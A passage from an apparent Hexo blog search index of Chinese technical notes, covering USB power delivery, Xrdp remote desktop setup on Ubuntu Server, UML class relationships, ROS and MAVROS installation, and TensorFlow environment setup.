<li><a href="https://stackoverflow.com/questions/64141900/three-js-animation-in-canvas-doesnt-resize-properly-in-vue-application" target="_blank" rel="noopener">Three.js Animation in Canvas doesn’t resize properly in Vue Application</a>,by stackoverflow.</li>
<li><a href="https://discoverthreejs.com/zh/book/first-steps/animation-system/" target="_blank" rel="noopener">three.js 动画系统</a>,by discoverthreejs.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title>USB供电能力简介</title>
    <url>/2019/08/20/USB%E4%BE%9B%E7%94%B5%E8%83%BD%E5%8A%9B%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>最近买了个行车记录仪，它通过USB接口供电，要求电源输入为5V2A，即要求电源的输出功率要达到10W。不想直接安装到车上，想插在电脑的USB接口上，测试行车记录仪的功能。那么电脑USB接口的供电能力足够吗？</p>
<h1 id="USB标准供电能力"><a href="#USB标准供电能力" class="headerlink" title="USB标准供电能力"></a>USB标准供电能力</h1><p>USB有多个标准，供电能力各不相同：</p>
<ul>
<li>USB1.1 传输速率最高12Mbps; 电源供应 5V 500mA</li>
<li>USB2.0 传输速率最高480Mbps; 电源供应 5V 500mA</li>
<li>USB3.0 传输速率最高5Gbps; 电源供应 5V 900mA</li>
</ul>
<p>最新的USB3.0标准输出电压为5V，输出电流最大为900mA，如果超过可能会因发热造成线路损坏。，因此电脑上的标准USB接口无法支持行车记录仪的正常使用。</p>
<p><strong>注意: 输出电压由电源输出决定，但输出电流大小由负载决定。</strong></p>
<h1 id="USB快充技术"><a href="#USB快充技术" class="headerlink" title="USB快充技术"></a>USB快充技术</h1><p>目前的快充技术基本有三种：USB-IF组织的USB PD、高通QC、联发科PEP/PE，其他手机厂商的快充方案大多来自这三个。</p>
<ul>
<li><p>USB PD（快充标准）目前基本绑定在USB3.0（数据传输标准）和USB Type-C（接头物理标准）上了，也得到谷歌和苹果两大巨头的支持，非常有希望成为未来的统一标准。</p>
</li>
<li><p>高通Quick Charge技术则是实际上被中高端智能手机采用最多的，小米、华硕、LG、乐视、中兴、HTC等最近两年的旗舰都是这个标准，三星FastCharge是QC的马甲，索尼也用QC。 由于硬件端和软件端都被强硬规定， 高通最新的QC 4.0已经使用了USB PD协议，成为了USB PD的一个分支。</p>
</li>
<li><p>联发科PEP技术推广成本最低，广泛用于中低端手机，魅族mCharge也是基于PEP。 不过联发科的PE3.0有可能被苹果采用。</p>
</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.ednchina.com/news/20180228.html" target="_blank" rel="noopener">关于USB快充你不得不知的几点问题</a>,by EDN.</li>
<li><a href="https://www.zhihu.com/question/20275311" target="_blank" rel="noopener">手机充电是用电脑 USB 快还是用插座快？</a>,by zhihu.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E7%93%A6%E7%89%B9" target="_blank" rel="noopener">瓦特</a>,by wikipedia.</li>
<li><a href="https://www.zhihu.com/question/50528184" target="_blank" rel="noopener">手机快充是跟数据线有关还是跟充电器有关？</a>,by zhihu.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>硬件</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu-18-04-Server安装图形界面和远程桌面连接</title>
    <url>/2021/11/06/Ubuntu-18-04-Server%E5%AE%89%E8%A3%85%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E5%92%8C%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/</url>
    <content><![CDATA[<p>远程云主机部署的Ubuntu 18.04 Server没有图形用户界面，而且自带的远程访问客户端不给力，因此考虑给Ubuntu 18.04 Server安装图形用户界面，同时打算使用Windows的</p>
<h1 id="安装图形界面"><a href="#安装图形界面" class="headerlink" title="安装图形界面"></a>安装图形界面</h1><p>Linux服务器未安装桌面环境。我们的第一步是安装X11和一个轻量级的桌面环境，该环境将充当Xrdp的后端。</p>
<p>Ubuntu存储库中有几种可用的桌面环境（DE）。我们将安装 Xfce 。这是一个快速，稳定且轻巧的桌面环境，非常适合在远程服务器上使用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt update sudo apt install xfce4 xfce4-goodies xorg dbus-x11 x11-xserver-utils</span><br></pre></td></tr></table></figure>

<h1 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h1><p>Xrdp是Microsoft远程桌面协议（RDP）的开源实现，允许您以图形方式控制远程系统。使用RDP，您可以登录到远程计算机并创建真实的桌面会话，就像登录到本地计算机一样。如果您想要开放源代码的远程桌面访问解决方案，请使用 VNC 。</p>
<h2 id="安装Xrdp"><a href="#安装Xrdp" class="headerlink" title="安装Xrdp"></a>安装Xrdp</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install xrdp</span><br><span class="line">sudo systemctl status xrdp</span><br></pre></td></tr></table></figure>

<h2 id="配置Xrdp"><a href="#配置Xrdp" class="headerlink" title="配置Xrdp"></a>配置Xrdp</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nano &#x2F;etc&#x2F;xrdp&#x2F;xrdp.ini</span><br><span class="line"># 在文件末尾添加以下行：</span><br><span class="line"># exec startxfce4 </span><br><span class="line"># 保存文件并重新启动Xrdp服务</span><br><span class="line">sudo systemctl restart xrdp</span><br></pre></td></tr></table></figure>

<h2 id="配置防火墙"><a href="#配置防火墙" class="headerlink" title="配置防火墙"></a>配置防火墙</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo ufw allow from 192.168.1.0&#x2F;24 to any port 3389</span><br><span class="line">sudo ufw allow 3389</span><br></pre></td></tr></table></figure>

<h2 id="连接到Xrdp服务器"><a href="#连接到Xrdp服务器" class="headerlink" title="连接到Xrdp服务器"></a>连接到Xrdp服务器</h2><p>如果您是Windows用户，则可以使用默认的RDP客户端。在Windows搜索栏中键入“ remote”，然后单击“ Remote Desktop Connection”。这将打开RDP客户端。在计算机字段中输入远程服务器IP地址，然后单击“连接”。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://segmentfault.com/a/1190000037561688" target="_blank" rel="noopener">Ubuntu server 18.04 安装图形化界面环境</a>,by alits.</li>
<li><a href="https://www.myfreax.com/how-to-install-xrdp-on-ubuntu-18-04/" target="_blank" rel="noopener">如何在Ubuntu 18.04上安装Xrdp Server（远程桌面）</a>,by myfreax.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>UML类图中类之间关系</title>
    <url>/2019/08/06/UML%E7%B1%BB%E5%9B%BE%E4%B8%AD%E7%B1%BB%E4%B9%8B%E9%97%B4%E5%85%B3%E7%B3%BB/</url>
    <content><![CDATA[<p>UML类图中类之间的关系主要有六种：泛化、实现、聚合、组合、依赖、关联。如图1所示。</p>
<p align="center">
    <img src="images/uml_class_struct.jpg" width="90%" alt="UML类图"/>
</p>

<ul>
<li>车的类图结构为&lt;<abstract>&gt;，表示车是一个抽象类；</li>
<li>它有两个继承类：小汽车和自行车；它们之间的关系为实现关系，使用带空心箭头的虚线表示；</li>
<li>小汽车为与SUV之间也是继承关系，它们之间的关系为泛化关系，使用带空心箭头的实线表示；</li>
<li>小汽车与发动机之间是组合关系，使用带实心箭头的实线表示；</li>
<li>学生与班级之间是聚合关系，使用带空心箭头的实线表示；</li>
<li>学生与身份证之间为关联关系，使用一根实线表示；</li>
<li>学生上学需要用到自行车，与自行车是一种依赖关系，使用带箭头的虚线表示；</li>
</ul>
<p>熟悉这六种关系及其符号表示，有利于我们设计类图和同行之间交流。下面介绍这六种关系。</p>
<h1 id="泛化关系-generalization"><a href="#泛化关系-generalization" class="headerlink" title="泛化关系(generalization)"></a>泛化关系(generalization)</h1><p>类的继承结构表现在UML中为：泛化(generalize)与实现(realize)：</p>
<p>继承关系为 is-a的关系；两个对象之间如果可以用 is-a 来表示，就是继承关系：（..是..)</p>
<p>例如：自行车是车、猫是动物。</p>
<p>泛化关系用一条带空心箭头的直接表示；如下图表示；</p>
<p align="center">
    <img src="images/uml_generalize.jpg" width="50%" alt="泛化关系"/>
</p>

<p>汽车在现实中有实现，可用汽车定义具体的对象；汽车与SUV之间为泛化关系；<strong>最终代码中，泛化关系表现为继承非抽象类；</strong></p>
<h1 id="实现关系-realize"><a href="#实现关系-realize" class="headerlink" title="实现关系(realize)"></a>实现关系(realize)</h1><p>实现关系用一条带空心箭头的虚线表示；</p>
<p>例如：”车”为一个抽象概念，在现实中并无法直接用来定义对象；只有指明具体的子类(汽车还是自行车)，才可以用来定义对象（”车”这个类在C++中用抽象类表示，在JAVA中有接口这个概念，更容易理解）</p>
<p align="center">
    <img src="images/uml_realize.jpg" width="50%" alt="实现关系"/>
</p>


<p><strong>最终代码中，实现关系表现为继承抽象类；</strong></p>
<h1 id="聚合关系-aggregation"><a href="#聚合关系-aggregation" class="headerlink" title="聚合关系(aggregation)"></a>聚合关系(aggregation)</h1><p>聚合关系用一条带空心菱形箭头的直线表示，如下图表示A聚合到B上，或者说B由A组成；</p>
<p align="center">
    <img src="images/uml_aggregation.jpg" width="50%" alt="聚合关系"/>
</p>

<p>聚合关系用于表示实体对象之间的关系，表示整体由部分构成的语义；例如一个部门由多个员工组成；</p>
<p>与组合关系不同的是，整体和部分不是强依赖的，即使整体不存在了，部分仍然存在；例如， 部门撤销了，人员不会消失，他们依然存在；</p>
<h1 id="组合关系-composition"><a href="#组合关系-composition" class="headerlink" title="组合关系(composition)"></a>组合关系(composition)</h1><p>组合关系用一条带实心菱形箭头直线表示，如下图表示A组成B，或者B由A组成；</p>
<p align="center">
    <img src="images/uml_composition.jpg" width="50%" alt="组合关系"/>
</p>

<p>与聚合关系一样，组合关系同样表示整体由部分构成的语义；比如公司由多个部门组成；</p>
<p>但组合关系是一种强依赖的特殊聚合关系，如果整体不存在了，则部分也不存在了；例如， 公司不存在了，部门也将不存在了；</p>
<h1 id="关联关系-association"><a href="#关联关系-association" class="headerlink" title="关联关系(association)"></a>关联关系(association)</h1><p>关联关系是用一条直线表示的；它描述不同类的对象之间的结构关系；它是一种静态关系， 通常与运行状态无关，一般由常识等因素决定的；它一般用来定义对象之间静态的、天然的结构； 所以，关联关系是一种“强关联”的关系；</p>
<p>比如，乘车人和车票之间就是一种关联关系；学生和学校就是一种关联关系；</p>
<p>关联关系默认不强调方向，表示对象间相互知道；如果特别强调方向，如下图，表示A<br>知道B，但 B不知道A；</p>
<p align="center">
    <img src="images/uml_association.jpg" width="50%" alt="关联关系"/>
</p>

<p><strong>在最终代码中，关联对象通常是以成员变量的形式实现的；</strong></p>
<h1 id="依赖关系-dependency"><a href="#依赖关系-dependency" class="headerlink" title="依赖关系(dependency)"></a>依赖关系(dependency)</h1><p>依赖关系是用一套带箭头的虚线表示的；如下图表示A依赖于B；他描述一个对象在运行期间会用到另一个对象的关系；</p>
<p align="center">
    <img src="images/uml_dependency.jpg" width="50%" alt="依赖关系"/>
</p>

<p>与关联关系不同的是，它是一种临时性的关系，通常在运行期间产生，并且随着运行时的变化； 依赖关系也可能发生变化；</p>
<p>显然，依赖也有方向，双向依赖是一种非常糟糕的结构，我们总是应该保持单向依赖，杜绝双向依赖的产生；</p>
<p><strong>在最终代码中，依赖关系体现为类构造方法及类方法的传入参数，箭头的指向为调用关系；依赖关系除了临时知道对方外，还是“使用”对方的方法和属性；</strong></p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://design-patterns.readthedocs.io/zh_CN/latest/read_uml.html" target="_blank" rel="noopener">看懂UML类图和时序图</a>,by me115.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu16.04安装MAVROS</title>
    <url>/2019/05/10/Ubuntu16-04%E5%AE%89%E8%A3%85MAVROS/</url>
    <content><![CDATA[<p>MAVROS包支持运行ROS的计算机、支持Mavlink的自驾仪、支持Mavlink的地面控制站之间使用Mavlink协议进行通信，如图1所示。</p>
<p align="center">
    <img src="images/px4_sitl_overview.png" width="90%" alt="px4软件在环仿真"/>
</p>
<center>图1  px4软件在环仿真</center>

<p>为构建px4软件在环仿真环境，下面介绍在协同计算机上安装Ubuntu16.04、ROS和MAVROS的步骤。</p>
<h1 id="安装ubuntu-16-04"><a href="#安装ubuntu-16-04" class="headerlink" title="安装ubuntu 16.04"></a>安装ubuntu 16.04</h1><p>安装ubuntu 16.04 LTS桌面板的教程请参考链接<a href="https://forum.ubuntu.org.cn/viewtopic.php?t=478527" target="_blank" rel="noopener">Ubuntu 16.04 安装基础入门教程（图文）</a>。</p>
<h1 id="安装ROS"><a href="#安装ROS" class="headerlink" title="安装ROS"></a>安装ROS</h1><h2 id="ROS简介"><a href="#ROS简介" class="headerlink" title="ROS简介"></a>ROS简介</h2><p>ROS（机器人操作系统，Robot Operating System），是专为机器人软件开发所设计出来的一套电脑操作系统架构。它是一个开源的元级操作系统（后操作系统），提供类似于操作系统的服务，包括硬件抽象描述、底层驱动程序管理、共用功能的执行、程序间消息传递、程序发行包管理，它也提供一些工具和库用于获取、建立、编写和执行多机融合的程序。</p>
<p>ROS的首要设计目标是在机器人研发领域提高代码复用率。ROS是一种分布式处理框架（又名Nodes）。这使可执行文件能被单独设计，并且在运行时松散耦合。这些过程可以封装到数据包（Packages）和堆栈（Stacks）中，以便于共享和分发。ROS还支持代码库的联合系统。使得协作亦能被分发。这种从文件系统级别到社区一级的设计让独立地决定发展和实施工作成为可能。上述所有功能都能由ROS的基础工具实现。</p>
<p>ROS有三个层次的概念：分别为Filesystem level，Computation graph level， 以及Communication level。 以下内容具体的总结了这些层次及概念。除了这三个层次的概念， ROS也定义了两种名称– Package资源名称和Graph资源名称。</p>
<h2 id="安装ROS-1"><a href="#安装ROS-1" class="headerlink" title="安装ROS"></a>安装ROS</h2><p>不建议在虚拟机中安装Ubuntu，再安装ROS。具体ROS安装步骤请参考<a href="https://www.cnblogs.com/liu-fa/p/5779206.html" target="_blank" rel="noopener">ROS 不能再详细的安装教程</a>和<a href="http://wiki.ros.org/kinetic/Installation/Ubuntu" target="_blank" rel="noopener">Ubuntu install of ROS Kinetic</a>。在此只简单记录Ubuntu 16.04 中安装ROS步骤：</p>
<ul>
<li>设置source.list</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo sh -c &#39;echo &quot;deb http:&#x2F;&#x2F;packages.ros.org&#x2F;ros&#x2F;ubuntu $(lsb_release -sc) main&quot; &gt; &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;ros-latest.list&#39;</span><br></pre></td></tr></table></figure>

<ul>
<li>设置公钥</li>
</ul>
<p>如何在连接服务器的过程中出现问题，可设置可选的hkp://pgp.mit.edu:80 或 hkp://keyserver.ubuntu.com:80</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-key adv --keyserver hkp:&#x2F;&#x2F;ha.pool.sks-keyservers.net:80 --recv-key 421C365BD9FF1F717815A3895523BAEEB01FA116</span><br></pre></td></tr></table></figure>

<ul>
<li>安装</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install ros-kinetic-desktop-full</span><br></pre></td></tr></table></figure>

<ul>
<li>初始化rosdep</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo rosdep init</span><br><span class="line">rosdep update</span><br></pre></td></tr></table></figure>

<ul>
<li>环境配置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;source &#x2F;opt&#x2F;ros&#x2F;kinetic&#x2F;setup.bash&quot; &gt;&gt; ~&#x2F;.bashrc</span><br><span class="line">source ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>

<ul>
<li>安装ros组件构建环境</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install python-catkin-tools python-rosinstall python-rosinstall-generator python-wstool build-essential -y</span><br></pre></td></tr></table></figure>

<h2 id="运行ROS"><a href="#运行ROS" class="headerlink" title="运行ROS"></a>运行ROS</h2><p>在Ubuntu 16.04终端中运行如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># roscore will start up a ROS Master, a ROS Parameter Server and a rosout logging node</span><br><span class="line">$ roscore</span><br><span class="line"></span><br><span class="line"># rosnode is a command-line tool for printing information about ROS Nodes.</span><br><span class="line">$ rosnode list</span><br><span class="line"></span><br><span class="line"># rospack allows you to get information about packages. </span><br><span class="line"></span><br><span class="line">$ rospack list</span><br><span class="line"></span><br><span class="line"># rosrun will locate PACKAGE and try to find an executable named EXECUTABLE in the PACKAGE tree. If it finds it, it will run it with ARGS.</span><br><span class="line"># Usage: rosrun [--prefix cmd] [--debug] PACKAGE EXECUTABLE [ARGS]</span><br><span class="line">$ rosrun turtlesim turtlesim_node</span><br><span class="line">$ rosrun turtlesim turtle_teleop_key</span><br><span class="line"></span><br><span class="line"># record the message which published in the topic</span><br><span class="line">$ rosbag record &#x2F;turtle1&#x2F;cmd_vel</span><br><span class="line"></span><br><span class="line"># check what&#39;s happen in ros system</span><br><span class="line">$ rosrun rqt_graph rqt_graph</span><br><span class="line"></span><br><span class="line"># rqt_plot displays a scrolling time plot of the data published on topics</span><br><span class="line">$ rosrun rqt_plot rqt_plot</span><br><span class="line"></span><br><span class="line"># rostopic is a command-line tool for printing information about ROS Topics.</span><br><span class="line">$ rostopic list</span><br><span class="line"></span><br><span class="line"># rostopic echo shows the data published on a topic.</span><br><span class="line">$ rostopic echo &#x2F;turtle1&#x2F;cmd_vel</span><br><span class="line"></span><br><span class="line"># rostopic type returns the message type of any topic being published.</span><br><span class="line">$ rostopic type &#x2F;turtle1&#x2F;cmd_vel</span><br><span class="line"></span><br><span class="line"># rostopic pub publishes data on to a topic currently advertised.</span><br><span class="line">$ rostopic pub -1 &#x2F;turtle1&#x2F;cmd_vel geometry_msgs&#x2F;Twist -- &#39;[2.0, 0.0, 0.0]&#39; &#39;[0.0, 0.0, 1.8]&#39;</span><br><span class="line"></span><br><span class="line"># rostopic hz reports the rate at which data is published.</span><br><span class="line">$ rostopic hz &#x2F;turtle1&#x2F;pose</span><br><span class="line"></span><br><span class="line"># check info of &#x2F;turtlesim node</span><br><span class="line">$ rosnode info &#x2F;turtlesim</span><br></pre></td></tr></table></figure>

<h1 id="安装MAVROS"><a href="#安装MAVROS" class="headerlink" title="安装MAVROS"></a>安装MAVROS</h1><p>具体安装MAVROS的步骤请参考链接<a href="https://dev.px4.io/en/ros/mavros_installation.html" target="_blank" rel="noopener">MAVROS</a>。下面简单介绍Ubuntu 16.04下从源代码安装MAVROS的过程。</p>
<ul>
<li>创建catkin工作空间</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir -p ~&#x2F;catkin_ws&#x2F;src</span><br><span class="line">cd ~&#x2F;catkin_ws</span><br><span class="line">catkin init</span><br><span class="line">wstool init src</span><br></pre></td></tr></table></figure>

<ul>
<li>安装MAVLink</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rosinstall_generator --rosdistro kinetic mavlink | tee &#x2F;tmp&#x2F;mavros.rosinstall</span><br></pre></td></tr></table></figure>

<ul>
<li>安装MAVROS</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rosinstall_generator --upstream mavros | tee -a &#x2F;tmp&#x2F;mavros.rosinstall</span><br></pre></td></tr></table></figure>

<ul>
<li>创建工作空间和依赖</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wstool merge -t src &#x2F;tmp&#x2F;mavros.rosinstall</span><br><span class="line">wstool update -t src -j4</span><br><span class="line">rosdep install --from-paths src --ignore-src -y</span><br></pre></td></tr></table></figure>

<ul>
<li>安装GeographicLib数据集</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo .&#x2F;src&#x2F;mavros&#x2F;mavros&#x2F;scripts&#x2F;install_geographiclib_datasets.sh</span><br></pre></td></tr></table></figure>

<ul>
<li>构建源</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">catkin build</span><br></pre></td></tr></table></figure>

<ul>
<li>添加工作空间到ros环境</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Needed or rosrun can&#39;t find nodes from this workspace.</span><br><span class="line">$ source devel&#x2F;setup.bash</span><br><span class="line"># Or write in .bashrc</span><br><span class="line">$ echo &quot;source ~&#x2F;catkin_ws&#x2F;devel&#x2F;setup.bash&quot; &gt;&gt; ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://forum.ubuntu.org.cn/viewtopic.php?t=478527" target="_blank" rel="noopener">Ubuntu 16.04 安装基础入门教程（图文）</a>, by ubuntu中文论坛.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E6%A9%9F%E5%99%A8%E4%BA%BA%E4%BD%9C%E6%A5%AD%E7%B3%BB%E7%B5%B1" target="_blank" rel="noopener">机器人操作系统</a>,by wikipedia.</li>
<li><a href="https://www.cnblogs.com/liu-fa/p/5779206.html" target="_blank" rel="noopener">ROS 不能再详细的安装教程</a>,by 小萌是个球.</li>
<li><a href="http://wiki.ros.org/kinetic/Installation/Ubuntu" target="_blank" rel="noopener">Ubuntu install of ROS Kinetic</a>, by ROS.org.</li>
<li><a href="http://wiki.ros.org/ROS/Tutorials" target="_blank" rel="noopener">ROS Tutorials</a>, by ROS.org.</li>
<li><a href="https://dev.px4.io/en/ros/mavros_installation.html" target="_blank" rel="noopener">MAVROS</a>, by DroneCode.</li>
<li><a href="https://blog.csdn.net/chishuideyu/article/details/53581013" target="_blank" rel="noopener">catkin 与 rosbuild解析及两者区别和联系</a>,by Xuefeng_BUPT.</li>
<li><a href="http://wiki.ros.org/ROS/Tutorials/InstallingandConfiguringROSEnvironment" target="_blank" rel="noopener">Installing and Configuring Your ROS Environment</a>, by ros.org.</li>
<li><a href="http://wiki.ros.org/ROS/Tutorials/InstallingandConfiguringROSEnvironment" target="_blank" rel="noopener">Installing and Configuring Your ROS Environment</a>,by ros.org.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
        <tag>PX4</tag>
        <tag>ROS</tag>
      </tags>
  </entry>
  <entry>
    <title>VC6环境下OpenGL配置</title>
    <url>/2020/12/08/VC6%E7%8E%AF%E5%A2%83%E4%B8%8BOpenGL%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>最近调试一个使用VC6开发环境，使用OpenGL编写的遗留程序。记录一下VC6开发环境下GLUT库的配置。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.jianshu.com/p/304295b72e5d" target="_blank" rel="noopener">(一)VC6.0写第一个OpenGL程序</a>,by wang_liang.</li>
<li><a href="https://www.jianshu.com/p/be32da974d8c" target="_blank" rel="noopener">OpenGL开发：官方GLUT库的环境配置</a>,by heguorui.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>TensorFlow对象检测API测试</title>
    <url>/2022/04/30/TensorFlow%E5%AF%B9%E8%B1%A1%E6%A3%80%E6%B5%8BAPI%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p>最近想研究一下红外图像的对象检测算法，于是先拿TensorFlow对象检测API学习一下。</p>
<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>准备工作主要有：</p>
<h2 id="pyenv安装python-3-9-6。"><a href="#pyenv安装python-3-9-6。" class="headerlink" title="pyenv安装python 3.9.6。"></a>pyenv安装python 3.9.6。</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pyenv install 3.9.6</span><br><span class="line">pyenv global 3.9.6</span><br></pre></td></tr></table></figure>

<h2 id="创建虚拟环境"><a href="#创建虚拟环境" class="headerlink" title="创建虚拟环境"></a>创建虚拟环境</h2><p>在windows系统中，使用如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 使用venv</span><br><span class="line">python -m venv tf2_api_env</span><br><span class="line">.\tf2_api_env\Scripts\activate</span><br><span class="line">deactivate</span><br><span class="line"></span><br><span class="line"># 使用virtualenv</span><br><span class="line">pip install virtualenv</span><br><span class="line">pyenv exec virtualenv tf2_api_env</span><br><span class="line">.\tf2_api_env\Scripts\activate</span><br><span class="line">deactivate</span><br></pre></td></tr></table></figure>

<p>在Linux系统中，使用如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 使用pyenv</span><br><span class="line"></span><br><span class="line"># 创建虚拟环境</span><br><span class="line">pyenv virtualenv tf2_api_env</span><br><span class="line"># 激活虚拟环境</span><br><span class="line">pyenv activate tf2_api_env</span><br><span class="line"></span><br><span class="line"># 使用venv</span><br><span class="line"></span><br><span class="line"># 创建虚拟环境</span><br><span class="line">python3 venv tf2_api_env</span><br><span class="line"># 激活虚拟环境</span><br><span class="line">source tf2_api_env&#x2F;bin&#x2F;activate</span><br></pre></td></tr></table></figure>

<h2 id="安装ipython，方便测试"><a href="#安装ipython，方便测试" class="headerlink" title="安装ipython，方便测试"></a>安装ipython，方便测试</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 进入虚拟环境</span><br><span class="line">pip install ipython -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="安装tensorflow"><a href="#安装tensorflow" class="headerlink" title="安装tensorflow"></a>安装tensorflow</h2><h3 id="安装非GPU版本tensorflow"><a href="#安装非GPU版本tensorflow" class="headerlink" title="安装非GPU版本tensorflow"></a>安装非GPU版本tensorflow</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 如果没有独立GPU</span><br><span class="line">pip install tensorflow&#x3D;&#x3D;2.8.0 -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F; </span><br><span class="line">pip install protobuf~&#x3D;3.20.1  -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="安装GPU版本tensorflow"><a href="#安装GPU版本tensorflow" class="headerlink" title="安装GPU版本tensorflow"></a>安装GPU版本tensorflow</h3><p>如果机器上有nvidia的显卡，则安装tensorflow的gpu版本，具体步骤如下：</p>
<p>第一步，安装tensorflow-gpu。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 如果有独立GPU</span><br><span class="line">pip install tensorflow-gpu&#x3D;&#x3D;2.8.0 -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F; --trusted-host pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure>

<p>第二步，安装CUDA与cuDNN。</p>
<ul>
<li>安装CUDA11.2。CUDA的版本由tensorflow-gpu的版本确定。具体请参考<a href="https://www.tensorflow.org/install/source_windows" target="_blank" rel="noopener">在 Windows 环境中从源代码构建</a>。<strong>本步骤在有nvidia独立显卡的前提下执行。</strong></li>
</ul>
<ul>
<li>安装CUDNN v8.1文件。CUDNN的版本由tensorflow-gpu的版本确定。具体请参考<a href="https://www.tensorflow.org/install/source_windows" target="_blank" rel="noopener">在 Windows 环境中从源代码构建</a>。<strong>本步骤在有nvidia独立显卡的前提下执行。</strong></li>
</ul>
<p>第三步，测试tensorflow能否识别使用nvidia gpu。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import tensorflow as tf</span><br><span class="line"># GPU测试</span><br><span class="line">gpu_device_name &#x3D; tf.test.gpu_device_name()</span><br><span class="line">print(gpu_device_name)</span><br><span class="line"> </span><br><span class="line">from tensorflow.python.client import device_lib</span><br><span class="line"> </span><br><span class="line"># 列出所有的本地机器设备</span><br><span class="line">local_device_protos &#x3D; device_lib.list_local_devices()</span><br><span class="line"> </span><br><span class="line"># 只打印GPU设备</span><br><span class="line">[print(x) for x in local_device_protos if x.device_type &#x3D;&#x3D; &#39;GPU&#39;]</span><br></pre></td></tr></table></figure>

<h3 id="tensorflow环境测试"><a href="#tensorflow环境测试" class="headerlink" title="tensorflow环境测试"></a>tensorflow环境测试</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># tensorflow环境测试</span><br><span class="line">import tensorflow as tf</span><br><span class="line">print(tf.__version__) </span><br><span class="line">print(tf.__path__)</span><br><span class="line"></span><br><span class="line"># 测试tensorflow</span><br><span class="line">python -c &quot;import tensorflow as tf;print(tf.reduce_sum(tf.random.normal([1000, 1000])))&quot;</span><br></pre></td></tr></table></figure>

<h2 id="安装TensorFlow-Models"><a href="#安装TensorFlow-Models" class="headerlink" title="安装TensorFlow Models"></a>安装TensorFlow Models</h2><h3 id="下载TensorFlow-Models"><a href="#下载TensorFlow-Models" class="headerlink" title="下载TensorFlow Models"></a>下载TensorFlow Models</h3><p>TensorFlow Model Garden。TensorFlow 模型花园是一个存储库，为 TensorFlow 用户提供了许多不同的最先进 (SOTA) 模型和建模解决方案的实现。我们旨在展示建模的最佳实践，以便 TensorFlow 用户可以充分利用 TensorFlow 进行研究和产品开发。</p>
